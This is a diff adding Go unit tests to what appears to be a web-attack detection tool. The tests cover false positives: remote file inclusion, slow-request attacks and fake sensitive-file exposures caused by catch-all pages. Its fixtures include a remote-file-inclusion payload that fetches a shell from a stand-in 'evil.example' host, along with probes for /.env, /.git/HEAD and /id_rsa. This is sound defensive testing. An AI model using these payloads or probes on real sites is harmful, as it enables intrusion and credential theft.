@@ -312,3 +312,134 @@ func TestAssetChainInternalOnlyHint(t *testing.T) {
 		t.Fatalf("横向移动不应提示登记授权扫描: %+v", c)
 	}
 }
+
+// 旧版本把本站的 pdf 预览地址记成了远程文件包含（疑似失陷资产里一直留着一条）：快照恢复时撤销；真实的远程文件包含保留。
+func TestPurgeSelfReferenceRFI(t *testing.T) {
+	s := newTestStore()
+	s.mu.Lock()
+	s.surf.Findings["succ:目录穿越/文件包含:mg.example.com /static/pdf/web/viewer.html"] = &Finding{ID: "a", Title: "疑似攻击成功: 目录穿越/文件包含", Category: "攻击成功研判",
+		Severity: model.SevHigh, Asset: "mg.example.com/static/pdf/web/viewer.html", Host: "mg.example.com", IPs: []string{"98.82.59.253"}, Count: 1,
+		Evidence: "98.82.59.253 GET 返回 200，远程文件包含: /static/pdf/web/viewer.html?file=https://mg.example.com:443/group1/m00/0b/53/ciisd…"}
+	s.surf.Findings["succ:目录穿越/文件包含:mg.example.com /x.php"] = &Finding{ID: "b", Title: "疑似攻击成功: 目录穿越/文件包含", Category: "攻击成功研判",
+		Severity: model.SevHigh, Asset: "mg.example.com/x.php", Host: "mg.example.com", IPs: []string{"203.0.113.5"}, Count: 1,
+		Evidence: "203.0.113.5 GET 返回 200，远程文件包含: /x.php?file=http://evil.example/shell.txt"}
+	s.mu.Unlock()
+	if n := len(s.CompromisedAssets()); n != 2 {
+		t.Fatalf("准备数据: %d", n)
+	}
+	path := filepath.Join(t.TempDir(), "state.json.gz")
+	if err := s.Save(path); err != nil {
+		t.Fatal(err)
+	}
+	r := newTestStore()
+	if err := r.Load(path); err != nil {
+		t.Fatal(err)
+	}
+	c := r.CompromisedAssets()
+	if len(c) != 1 || !strings.Contains(c[0].Asset, "/x.php") {
+		t.Fatalf("应只撤销指向本站的远程文件包含: %+v", c)
+	}
+}
+
+// 旧版本把 SockJS 长连接的不断重连判为慢请求攻击，记进了站点的“影响”：查询时按需核实处理。
+func TestAssetChainLongLivedTimeout(t *testing.T) {
+	s := newTestStore()
+	s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "60.2.41.105", Host: "mg.example.com", Method: "GET", URI: "/websocket/384/trcboqfg/websocket",
+		Status: 200, Time: time.Now().Add(-time.Hour)}, []model.Hit{hit("bhv-timeout", "CC攻击", model.PhaseImpact, model.SevMedium, model.ResultUnknown)})
+	c := s.AssetChain("mg.example.com")
+	if c == nil || slices.Contains(c.Reached, "impact") || !slices.Contains(c.Weak, "impact") {
+		t.Fatalf("长连接的“慢请求攻击”不应推进到影响: %+v", c)
+	}
+}
+
+// 生产环境的旧数据：首页健康检查 479 字节，扫描器探测 /.env 拿到 477 字节（同一页面按请求头差了 2 字节），
+// 旧版本没有记录响应大小，还把带 Range 头的 /db.sql、/backup.bak（206）登记成了敏感入口。
+// 快照恢复时清理；真实存在的入口（302 跳转的后台、大小明显不同的备份文件）保留。
+func TestCleanLegacyFallback(t *testing.T) {
+	s := newTestStore()
+	const site = "mg.example.com"
+	s.mu.Lock()
+	sf := s.surf
+	home := &Endpoint{Host: site, Path: "/", Methods: map[string]int{}, Status: map[int]int{200: 200}, atk: map[string]struct{}{}}
+	for i := range 200 {
+		b := int64(479)
+		if i%7 == 0 {
+			b = 1286
+		}
+		home.observeNormal(b)
+		home.noteSize(b)
+	}
+	sf.Endpoints[site+" /"] = home
+	legacy := func(path string, status map[int]int, sens string) {
+		n := 0
+		for _, c := range status {
+			n += c
+		}
+		sf.Endpoints[site+" "+path] = &Endpoint{Host: site, Path: path, Methods: map[string]int{}, Status: status, Hits: int64(n), Attacks: int64(n),
+			Sensitive: sens, atk: map[string]struct{}{}}
+	}
+	legacy("/.env", map[int]int{200: 25}, "密钥/凭证文件可公开访问")
+	legacy("/db.sql", map[int]int{200: 3, 206: 3}, "备份/数据库文件可下载")
+	legacy("/backup.bak", map[int]int{206: 3}, "备份/数据库文件可下载")
+	legacy("/config.bak", map[int]int{200: 2}, "备份/数据库文件可下载")
+	legacy("/admin", map[int]int{302: 4}, "管理后台/运维入口对外暴露")
+	sf.Findings["sens:"+site+" /.env"] = &Finding{ID: "sens:" + site + " /.env", Category: "敏感资源暴露", Evidence: "43.242.97.54 访问返回 200，响应 477 字节", Count: 2}
+	sf.Findings["sens:"+site+" /config.bak"] = &Finding{ID: "sens:" + site + " /config.bak", Category: "敏感资源暴露", Evidence: "203.0.113.5 访问返回 200，响应 81230 字节", Count: 1}
+	s.mu.Unlock()
+
+	path := filepath.Join(t.TempDir(), "state.json.gz")
+	if err := s.Save(path); err != nil {
+		t.Fatal(err)
+	}
+	r := newTestStore()
+	if err := r.Load(path); err != nil {
+		t.Fatal(err)
+	}
+	r.mu.RLock()
+	defer r.mu.RUnlock()
+	for _, p := range []string{"/.env", "/db.sql", "/backup.bak"} {
+		if r.surf.Endpoints[site+" "+p] != nil {
+			t.Errorf("%s 是兜底页面，应撤销", p)
+		}
+	}
+	if r.surf.Findings["sens:"+site+" /.env"] != nil || !r.surf.isFallback(site, 477) {
+		t.Error("证据中的 477 字节与首页 479 字节只差 2 字节：应撤销并记为兜底页面大小")
+	}
+	for _, p := range []string{"/config.bak", "/admin", "/"} {
+		if r.surf.Endpoints[site+" "+p] == nil {
+			t.Errorf("%s 确实存在，应保留", p)
+		}
+	}
+	if r.surf.Findings["sens:"+site+" /config.bak"] == nil {
+		t.Error("大小明显不同的备份文件是真实的暴露，应保留")
+	}
+}
+
+// 运行中：2 个不同探测路径的大小完全相同、且与首页的常见大小只差几个字节，即认定为兜底页面（不必等 3 个）。
+func TestCatchAllTwoPathsNearHome(t *testing.T) {
+	s := newTestStore()
+	now := time.Now().Add(-time.Hour)
+	const site = "mg.example.com"
+	for i := range 60 { // 健康检查 479 字节，浏览器拿到 2 万字节左右的首页：均值与方差判断不了
+		b := int64(479)
+		if i%3 == 0 {
+			b = 20000 + int64(i)
+		}
+		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: fmt.Sprintf("10.0.0.%d", i%20+1), Host: site, Method: "GET", URI: "/", Status: 200, Bytes: b, Time: now, UA: "Mozilla/5.0"}, nil)
+	}
+	probe := func(uri string, bytes int64) {
+		s.Record(&model.Event{Kind: model.KindWeb, SrcIP: "43.242.97.54", Host: site, Method: "GET", URI: uri, Status: 200, Bytes: bytes, Time: now},
+			[]model.Hit{hit("sens-secret", "敏感文件探测", model.PhaseRecon, model.SevHigh, model.ResultSuccess)})
+	}
+	probe("/.env", 477)
+	probe("/.git/HEAD", 477)
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	if !s.surf.isFallback(site, 477) || s.surf.Endpoints[site+" /.env"] != nil || s.surf.Findings["sens:"+site+" /.env"] != nil {
+		t.Fatal("第二条同样大小、接近首页的探测应确认兜底页面，并撤销第一条")
+	}
+	// 只有一条接近首页大小的探测（可能是真实的小文件）：不判定
+	if s.surf.catchAll(site, "/id_rsa", 482) {
+		t.Fatal("单独一次接近首页大小不足以判定兜底页面")
+	}
+}
